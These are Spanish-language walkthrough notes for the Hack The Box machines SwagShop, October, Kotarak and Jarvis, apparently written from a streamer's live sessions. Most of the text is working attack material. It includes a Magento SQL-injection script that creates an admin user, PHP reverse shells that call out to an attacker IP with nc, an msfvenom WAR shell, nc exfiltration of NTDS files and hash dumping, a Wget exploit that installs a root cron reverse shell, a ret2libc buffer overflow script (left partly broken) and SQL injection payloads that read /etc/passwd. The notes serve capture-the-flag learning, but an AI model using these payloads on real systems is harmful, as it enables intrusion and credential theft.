wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.140/index.php/FUZZ
```

Encontramos unas rutas:

- admin
- catalog
- home
- contacts
- home

Miramos lo que hay en la routa `http://10.10.10.140/index.php/admin`

Checkeamos en la web si existen credenciales por defecto para Magento pero no funcciona. Miramos si existe algo interesante en **exploit-db**


<!--chapter:end:22-SwagShop/22-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Checkeando exploit para Magento {-}

```bash
searchsploit magento
```

Vemos un exploit que nos llama la atencion -> Magento eCommerce - Remote Code Execution

Nos copiamos el script en el directorio actual de trabajo y lo analyzamos

```bash
searchsploit -m 37977
mv 37977.py magento_rce.py
vi magento_rce.py
```

Modificamos el script para que funccione

```python
import requests
import base64
import sys

target = "http://10.10.10.140/index.php"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username="forme", password="forme")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url,
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds forme:forme".format(target)
else:
    print "DID NOT WORK"
```

Lanzamos el script con el commando `python3 magento_rce.py` y nos dice que el script a funccionado y a creado un usuario forme con la contraseña forme.

Lo miramos desde la web y entramos en Admin panel de Magento.

<!--chapter:end:22-SwagShop/22-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso desde Magento {-}

Para ganar acceso desde un panel Admin de Magento siempre va de la misma forma.

Nos ponemos en escucha por el puerto 443

```bash
nc -nlvp 443
```

Desde el panel de configuration de Magento

1. Vamos al menu `System -> Configuration`.
1. En el Menu de izquierda vamos a `ADVANCED -> Developer`
1. En Template Settings Habilitamos los Symlinks y damos al boton `Save Config`
1. En el menu principal, le damos a `catalog -> Manage Categories`

Aqui tenemos que crear una reverse shell `vi shell.php.png`

```php
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
```

De esta manera, la podemos subir al magento en la parte **Image**, en Name ponemos **test** y damos al boton Save Category
Si hacemos hovering por encima del link de la imagen vemos la routa siguiente

`http://swagshop.htb/media/catalog/category/shell.php.png`

Aqui creamos un nuevo Newsletter Template.

1. En el menu Pricipal damos a `Newsletter -> Newsletter Templates`
1. damos al boton Add Newsletter Template
1. En el formulario le ponemos

    - Template Name: `Test`
    - Template Subject: `Test`
    - Template Content: `{{block type="core/template" template="../media/catalog/category/shell.php.png"}}`

1. le damos al boton Save Template, pinchamos al template creado y le damos a preview template

Aqui no passa nada, lo que quiere decir que la profundida del path traversal no es buena. Intentamos con 2 `../../media` hasta llegar
a la buena profundidad que seria `../../../../../../media/catalog/category/shell.php.png` y hemos ganado acceso a la maquina victima.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `cd /home` vemos que hay un usuario haris que contiene el **user.txt** y podemos ver la flag

<!--chapter:end:22-SwagShop/22-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
> Permission denied
id
sudo -l
```

Vemos que podemos lanzar `/usr/bin/vi` como root sin proporcionar contraseña.

Como con vi se puede settear nuevas variables, es muy facil rootear esta maquina

```bash
sudo -u root vi /var/www/html/EEEEEE
:set_shell=/bin/bash
:shell
```

Ya tenemos una consola como root y podemos visualizar la flag

<!--chapter:end:22-SwagShop/22-04-PrivilegeEscalation.Rmd-->

# October {-}

## Introduccion {-}

La maquina del dia 14/08/2021 se llama October.

El replay del live se puede ver aqui

[![S4vitaar October maquina](https://img.youtube.com/vi/6vjzcoBA5ps/0.jpg)](https://www.youtube.com/watch?v=6vjzcoBA5ps)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:23-October/23-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.16
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.16
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.16 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.16 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?           |
| ------ | -------- | ------------------ | -------------------- |
| 22     | ssh      | Conneccion directa | usuario y contraseña |
| 80     | http     | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.16
```

Vemos que estamos en frente de una maquina Linux servido por un Apache 2.4.7 con un php 5.5.9-1.
Vemos que estamos en frente de un October CMS - Vanilla.

#### Checkear la web del puerto 80 {-}

Con firefox navigamos en la web para ver lo que es. El Wappalyzer nos confirma que estamos contra un October CMS y Laravel.
Como es un gestor de contenido buscamos en google la routa del admin panel y vemos que esta en `/backend`.


<!--chapter:end:23-October/23-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Checkeando vulnerabilidades para October CMS {-}

En el panel de login, probamos `admin-admin` y entramos en el panel de administracion.

;)

<!--chapter:end:23-October/23-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso desde October CMS {-}

Navigando en la web vemos que hay un fichero .php5 y un boton que nos lleva al fichero

decidimos crearnos un fichero `.php` y subirlo

```bash
vi shell.php5
```

```php
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
```

Nos ponemos en escucha por el puerto 443 

```bash
nc -nlvp 443
```

y subimos el archivo pulsando el boton upload y con el link que nos da October vamos a la pagina creada.
Vemos que hemos ganado accesso a la maquina victima.

```bash
whoami 

>www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `cd /home` vemos que hay un usuario harry que contiene el **user.txt** y podemos ver la flag

<!--chapter:end:23-October/23-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
> Permission denied
id
sudo -l
uname -a

find \-perm -4000 2>/dev/null
```

Aqui vemos un binario interesante `./usr/local/bin/ovrflw`

Lanzamos el binario y vemos que nos pide un input string.


### Bufferoverflow {-}

#### Checkamos si es un bufferoverflow {-}

```bash
ovrflw AAAAAA
ovrflw EEEEEEEEEEEEEEE
which python

ovrflw $(python -c 'print "A"*500')
```

Vemos que hay un **segmentation fault** como error, lo que nos dice que este binario es vulnerable a un Bufferoverflow.

#### Installamos Peda en la maquina victima {-}

Installamos peda en la maquina victima:

```bash
cd /tmp
git clone https://github.com/longld/peda.git
export HOME=/tmp
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

#### Analizamos los registros con peda {-}

```bash
gdb ovrflw
> r
> r AAAA
> r $(python -c 'print "A"*500')
```

<div class="figure">
<img src="images/October-EBP-EIP-overwrite.png" alt="EBP EIP overwrite" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-53)EBP EIP overwrite</p>
</div>

Aqui vemos que el registrop EBP y EIP han sido sobre escribido. 

#### Buscando el tamaño antes de sobre escribir el EIP {-}

Creamos un patron con peda

```bash
> pattern_create 500
gdb-peda$ pattern_create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAg
AA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAA
wAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%J
A%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%u
A%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3As
IAseAs4AsJAsfAs5AsKAsgAs6A'

> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAA
wAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%u
A%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
```

Si le damos a `p $eip` ya sabemos que es el valor del eip en este caso `0x41384141`. Ya podemos calcular el offset.

```bash
pattern_offset 0x41384141
```

ya nos dice que el offset es de 112.

Lo comprobamos poniendo 112 A y 4 B.

```bash
> r $(python -c 'print "A"*112 + "B"*4)
```

Aqui ya vemos que el EIP vale `0x42424242` que son 4 B en hexadecimal

#### Buscando la direccion despues del registro EIP {-}

```bash
> r $(python -c 'print "A"*112 + "B"*4 + "C"*200)
> x/80wx $esp
```

<div class="figure">
<img src="images/October-esp_entries.png" alt="ESP Entries" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-54)ESP Entries</p>
</div>

La idea seria de appuntar el EIP a la direccion `0xbf8d5310` y cambiar los C por codigo malicioso pero si miramos
las proteccionnes del programa con 

```bash
> checksec
```

Vemos que el NX esta Enabled. El NX tambien llamado DEP (Data Execution Prevention) es una proteccion que deshabilita la 
ejecucion de codigo en la pila, esto significa que si le ponemos codigo malicioso en el EIP, el flujo del programa no lo 
va a ejecutar.

Como no se puede ejecutar nada directamente en la pila, tenemos que mirar las libraries compartidas del programa para ver
si podemos llamar a otra cosa que la propria pila.

#### Buscando librerias compartidas {-}

```bash
ldd /usr/local/bin/ovrflw
    linux-gate.so
    libc.so.6
    /lib/ld-linux.so.2
```

Aqui la libreria `libc.so` esta interesante porque nos permitiria ejecutar commandos a nivel de systema. Y si recordamos bien,
el binario ovrflw tiene permisos SUID.

```bash
ldd /usr/local/bin/ovrflw
ldd /usr/local/bin/ovrflw | grep libc
ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}'
ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'
```

Aqui vemos la direccion de la libreria `0xb758a000`

Miramos si la direccion cambia a cada ejecucion

```bash
for i in $(seq 10); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
```

Aqui vemos que la direccion esta cambiando. Pero si cojemos una de la direcciones por ejemplo la `0xb75e7000` y la grepeamos
al bucle

```bash
for i in $(seq 10); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done | grep "0xb75e7000"
```

nos damos cuenta que esta direccion apparece multiples vecez. Esto pasa porque estamos frente una maquina de 32 bits.

#### La technica ret2libc {-}

La technica ret2libc es una technica que funcciona de una manera muy sencilla y es poniendole la direccion de la funccion system, seguida de la funccion
exit sequida de la funccion que queremos lanzar con la libreria en nuestro caso un /bin/sh.

Para encontrar la direccionnes de estas funcciones, primero tenemos que encontrar el offset que seria la differencia entre la posicion de la funccion con la
posicion de la libreria. Esto quiere decir que si sumamos los dos, conocemos la direccion de las differentes funccionnes.

Para conocer el offset, utilizamos la utilidad readelf:

1. Buscamos el offset del commado **system** de la libreria libc.so

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "system"
    ```

1. Buscamos el offset del commando **exit** de la misma libreria

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "exit"
    ```

1. Buscamos el offset del commando **/bin/sh** en la misma libreria

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "/bin/sh"
    ```

los offsets encontrados en este caso son:

- system    : 00040310
- exit      : 00033260
- /bin/sh   : 162bac

La utilidad readelf nos permitte ver el offset de estos commandos de manera a que si sumamos la direccion de la libreria libc.so
al offset, conocemos la direccion exacta de los differentes commandos.

Una vez connocemos estas direcciones, utilizaremos la techniqua ret2libc para ejecutar el commando /bin/sh como root.

#### Creamos el exploit en python {-}

```python
#!/usr/bin/python3

import signal
from struct import pack
from subprocess import call

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n\n")
    sys.exit(1)

#Ctrl_C
signal.signal(signal.SIGINT, def_handler)

def exploit():
    base_libc_address = 0xb75e7000

    system_address_offset = 0x00040310
    exit_address_offset = 0x00033260
    bin_sh_address_offset = 0x00162bac

    system_address = pack("<I", base_libc_address + system_address_offset)
    exit_address = pack("<I", base_libc_address + exit_address_offset)
    bin_sh = pack("<I", base_libc_address + bin_sh_address_offset)

    offset = 112
    before_eip = b"A"*offset
    eip = system_address + exit_address + bin_sh

    payload = before_eip + eip + after_eip

if __name__ == '__main__':
    payload = exploit()

    while True:
        response = call(["/usr/local/bin/ovrflw", payload])

        if response == 0:
            print("\n\n[!] Saliendo...\n\n")
            sys.exit(1)

```

En este script podemos ver que el valor que queremos dar al EIP es el **ret2libc** (system address + exit address + /bin/sh address).

Si lanzamos el script `python3 exploit.py`, va a tardar un poco. Tardara finalmente el tiempo que la direccion de la libreria libc sea la misma 
que la que hemos puesto en el script.

Ya vemos que nos entabla un /bin/sh y `whoami` -> root.


<!--chapter:end:23-October/23-04-PrivilegeEscalation.Rmd-->

# Kotarak {-}

## Introduccion {-}

La maquina del dia 17/08/2021 se llama Kotarak.

El replay del live se puede ver aqui

[![S4vitaar Kotarak maquina](https://img.youtube.com/vi/PaLGNg2k8Zs/0.jpg)](https://www.youtube.com/watch?v=PaLGNg2k8Zs)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:24-Kotarak/24-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.55
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.55
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.55 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,8009,8080,60000, 10.10.10.55 -oN targeted
```


| Puerto | Servicio    | Que se nos occure? | Que falta?           |
| ------ | ----------- | ------------------ | -------------------- |
| 22     | ssh         | Conneccion directa | usuario y contraseña |
| 8009   | tcp ajp13   | Web, Fuzzing       |                      |
| 8080   | http tomcat | Web, Fuzzing       |                      |
| 60000  | http apache | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.55:8080
```

Nada interressante aqui

#### Checkear la web por los differentes puertos {-}

- El puerto 8009 no sale Nada.
- El puerto 8080 nos saca un 404
- El puerto 60000 nos sale una pagina

La pagina en el puerto 60000 parece ser un web browser que podriamos utilizar para navigar sobre otras paginas web de manera anonyma.

Creamos nuestro proprio servidor web para ver lo que pasa.

```bash
vi index.html

Hola, Vodafone apestais y sois los peores....
```

Compartimos un servidor web con python

```bash
python3 http.server 80
```

Si desde la web lanzamos un `http://10.10.14.6` vemos nuestra pagina web. Intentamos crear una pagina php pero no funcciona. 


<!--chapter:end:24-Kotarak/24-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### HTML Injection, XSS y SSRF {-}

Intentamos con etiquetas html y script... vemos que el servicio es vulnerable a html injection y XSS pero no podemos hacer muchas cosas con esto.

Vamos a ver si es vulnerable a un **SSRF** (Server Side Request Forgery). Si le ponemos `localhost:22` la pagina nos reporta la cabezera des servicio
ssh. Vamos aqui a utilizar WFUZZ para enumerar los puertos internos que estan abiertos.

#### Uzando WFUZZ para enumerar los puertos internos abiertors {-}

```bash
wfuzz -c -t 200 --hc=404 -z range,1-65535 "http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ"
```

Aqui vemos que hay muchas respuestas que nos dan 2 caracteres de respuesta y esto lo vamos a ocultar.

```bash
wfuzz -c -t 200 --hh=2 --hc=404 -z range,1-65535 "http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ"
```

Aqui vemos muchos puertos addicionales que no nos reporto el scanning de NMAP como los puertos

- 320
- 90
- 888
- 110
- 200
- 3306 (mysql)

Verificamos estos puertos con la web y encontramos cosas muy interesante como un panel de administracion en el puerto 320 y un listador
de ficheros en el puerto 888. Encontramos un fichero backup y lo miramos desde la web `http://10.10.10.55:60000/url.php?path=http://localhost:888/?doc=backup`
y mirando el codigo fuente encontramos informaciones muy interesante en el XML. Vemos un usuario admin y su contraseña.

Como vemos que el fichero XML es un fichero de configuracion tomcat miramos si las credenciales son validas en el servicio del puerto 8080

<!--chapter:end:24-Kotarak/24-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Conneccion en el panel de administracion de Tomcat {-}

Como todos los servicios tomcat, el panel de administracion se encuentra en la routa `/manager/html`

lo miramos en la url `http://10.10.10.55:8080/manager/html`

Una vez ganado el accesso al panel de administracion de tomcat, ya savemos que podemos subir un **war**
malicioso.

```bash
msfvenom -l payload | grep "jsp"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f war -o reverse.war
```

subimos el fichero en la web.

Nos ponemos en escucha con netcat por el puerto 443

```bash
nc -nlvp 443
```

Pinchamos el fichero reverse.war y vemos que ya hemos ganado acceso al systema

```bash
whoami

> tomcat
```

### Tratamiento de la TTY {-}

```bash
which python
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `cd /home` vemos que hay dos usuarios tomcat y atanas

```bash
find \-name user.txt 2>/dev/null | xargs cat
```

Vemos que la flag esta en el directorio **atanas** y que no podemos leer la flag

### User pivoting al usuario atanas {-}

```bash
cd tomcat
ls -la
cd to_archive
ls -la
cd pentest_data
ls -la
file *
```

Aqui vemos que hay dos ficheros y con el commando `file` vemos que hay un fichero data y un MS Windows registry file NT/2000.
Nos traemos estos dos ficheros a nuestro equipo de atacante.

1. en la maquina de atacante

    ```bash
    nc -nlvp 443 > ntds.bin
    ```

1. en la maquina victima

    ```bash
    nc 10.10.14.6 443 < 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
    ```

1. en la maquina de atacante

    ```bash
    nc -nlvp 443 > ntds.dit
    ```

1. en la maquina victima

    ```bash
    nc 10.10.14.6 443 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
    ```

#### Recuperando hashes nt desde ficheros Active Directories {-}

```bash
mv ntds.dit ntds
mv ntds.bin SYSTEM
impacket-secretsdump -ntds ntds -system SYSTEM LOCAL
```

Aqui copiamos los diferentes hashes en un fichero llamado hash

<div class="figure">
<img src="images/Kotrarak-hashes.png" alt="hashes ntds" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-55)hashes ntds</p>
</div>

cat hash | awk '{print $4}' FS=":" y copiamos los hashes en la pagina [crack station](https://crackstation.net/)

<div class="figure">
<img src="images/Kotarak-crackstation.png" alt="hashes crackstation" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-56)hashes crackstation</p>
</div>

intentamos las contraseñas para pasar al usuario atanas

```bash
su atanas
Password: f16tomcat!
whoami
> atanas
```

y ya podemos ver la flag

<!--chapter:end:24-Kotarak/24-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
cat flag.txt
```

Hemos podido entrar en el repertorio root pero la flag no es la buena. Hay un fichero app.log y vemos que hay una tarea
que parece que se lanza cada 2 minutos y que nos hace un GET desde la maquina 10.0.3.133 a la maquina victima.

Intentamos ponernos en escucha al puerto 80 con ncat pero tenemos un Permission denied. Miramos si la utilidad authbind esta installada porque
authbind es un binario que permite a un usuario con bajos privilegios de ponerse en escucha por un puerto definido.

```bash
which authbind
ls -la /etc/authbind/byport
```

Aqui vemos que hay dos puertos el 21 y el 80.

```bash
authbind nc -nlvp 80
```

Ya vemos que la tarea sigue siendo ejecutada y vemos que la maquina 10.0.3.133 utiliza una version de Wget que esta desactualizada.

Miramos si existe un exploit para esta version

```bash
searchsploit wget 1.16
```

y vemos que hay un Arbitrary File Upload / Remote Code Execution.

```bash
searchsploit -x 40064
```

Seguimos por pasos la explicacion del exploit

1. creamos un fichero .wgetrc y le insertamos

    ```bash
    cat <<_EOF_>.wgetrc
    post_file = /etc/shadow
    output_document = /etc/cron.d/wget-root-shell
    _EOF_
    ```

1. creamos un script en python 

    ```python
    #!/usr/bin/env python

    #
    # Wget 1.18 < Arbitrary File Upload Exploit
    # Dawid Golunski
    # dawid( at )legalhackers.com
    #
    # http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
    #
    # CVE-2016-4971
    #

    import SimpleHTTPServer
    import SocketServer
    import socket;

    class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        # This takes care of sending .wgetrc

        print "We have a volunteer requesting " + self.path + " by GET :)\n"
        if "Wget" not in self.headers.getheader('User-Agent'):
        print "But it's not a Wget :( \n"
            self.send_response(200)
            self.end_headers()
            self.wfile.write("Nothing to see here...")
            return

        print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
        self.send_response(301)
        new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
        print "Sending redirect to %s \n"%(new_path)
        self.send_header('Location', new_path)
        self.end_headers()

    def do_POST(self):
        # In here we will receive extracted file and install a PoC cronjob

        print "We have a volunteer requesting " + self.path + " by POST :)\n"
        if "Wget" not in self.headers.getheader('User-Agent'):
        print "But it's not a Wget :( \n"
            self.send_response(200)
            self.end_headers()
            self.wfile.write("Nothing to see here...")
            return

        content_len = int(self.headers.getheader('content-length', 0))
        post_body = self.rfile.read(content_len)
        print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)

        print "Sending back a cronjob script as a thank-you for the file..."
        print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(ROOT_CRON)

        print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"

        return

    HTTP_LISTEN_IP = '0.0.0.0'
    HTTP_LISTEN_PORT = 80
    FTP_HOST = '10.10.10.55'
    FTP_PORT = 21

    ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f \n"

    handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

    print "Ready? Is your FTP server running?"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((FTP_HOST, FTP_PORT))
    if result == 0:
    print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
    else:
    print "FTP is down :( Exiting."
    exit(1)

    print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT

    handler.serve_forever()
    ```

1. habrimos en una ventana el puerto 21 para el ftp

    ```bash
    authbind python -m pyftpdlib -p21 -w
    ```

1. en la otra ventana lanzamos el exploit

    ```bash
    authbind python wget-exploit.py
    ```

en la maquina de atacante nos ponemos en escucha por el puerto 443 y esperamos que nos entable esta Coneccion.


`whoami` -> root ;)

<!--chapter:end:24-Kotarak/24-04-PrivilegeEscalation.Rmd-->

# Jarvis {-}

## Introduccion {-}

La maquina del dia 18/08/2021 se llama Jarvis.

El replay del live se puede ver aqui

[![S4vitaar Jarvis maquina](https://img.youtube.com/vi/OPDexy66TD0/0.jpg)](https://www.youtube.com/watch?v=OPDexy66TD0)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:25-Jarvis/25-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.143
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.143
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.143 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80,64999, 10.10.10.143 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?           |
| ------ | -------- | ------------------ | -------------------- |
| 22     | ssh      | Conneccion directa | usuario y contraseña |
| 80     | http     | Web, Fuzzing       |                      |
| 64999  | http     | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.143
```

Vemos un dominio `logger.htb` pero poco mas. Añadimo el dominio a nuestro `/etc/hosts`

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.143 -oN webScan
```

Vemos que hay un `/phpmyadmin`

#### Analyzando la web con Firefox {-}

Es una web de un hotel donde se puede hacer reservaciones. Cuando miramos mas en profundidad, nos damos cuenta de algo que nos 
llama la atencion `http://10.10.10.143/room.php?cod=6`

Si cambiamos el **cod** con numeros invalidos vemos que intenta mostrarnos algo sin mensajes de error. Vamos a comprobar si esta
vulnerable a injeccion SQL

<!--chapter:end:25-Jarvis/25-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### SQL Injection {-}

Intentamos ver si la web responde a un ordenamiento de datos para ver si es vulnerable a Injeccion SQL:

```bash
http://10.10.10.143/room.php?cod=-1 order by 1 -- -
http://10.10.10.143/room.php?cod=-1 order by 2 -- -
http://10.10.10.143/room.php?cod=-1 order by 3 -- -
http://10.10.10.143/room.php?cod=-1 order by 4 -- -
http://10.10.10.143/room.php?cod=-1 order by 5 -- -
http://10.10.10.143/room.php?cod=-1 order by 6 -- -
http://10.10.10.143/room.php?cod=-1 order by 7 -- -
http://10.10.10.143/room.php?cod=-1 order by 8 -- -
http://10.10.10.143/room.php?cod=-1 order by 9 -- -
```

Aqui no vemos nada. Intentamos ver con un union select si podemos enumerar las columnas

```bash
http://10.10.10.143/room.php?cod=-1 union select 1,2 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,3 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7 -- -
```

Cuando acemos una selection de las 7 columnas, podemos ver en la web que nos reporta estas etiquetas en la pagina.


<div class="figure">
<img src="images/Jarvis-union-select.png" alt="SQL Injection Union select" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-57)SQL Injection Union select</p>
</div>

Aqui vemos que podemos injectar SQL en las columnas **5 - 2 - 3 - 4**

```bash
http://10.10.10.143/room.php?cod=-1 union select 1,2,database(),4,5,6,7 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,version(),4,5,6,7 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,user(),4,5,6,7 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/etc/passwd"),4,5,6,7 -- -
```

> [ ! ] NOTAS: Si la web no deja incorporar String como en el methodo load_file, se puede transformar el String `/etc/passwd` en hexadecimal y colocarlo ahi. Haciendo
un `echo "/etc/passwd" | tr -d '\n' | xxd -ps` -> 2f6574632f706173737764 y ponerlo en la web `1,2,load_file(0x2f6574632f706173737764),4,5,6,7`

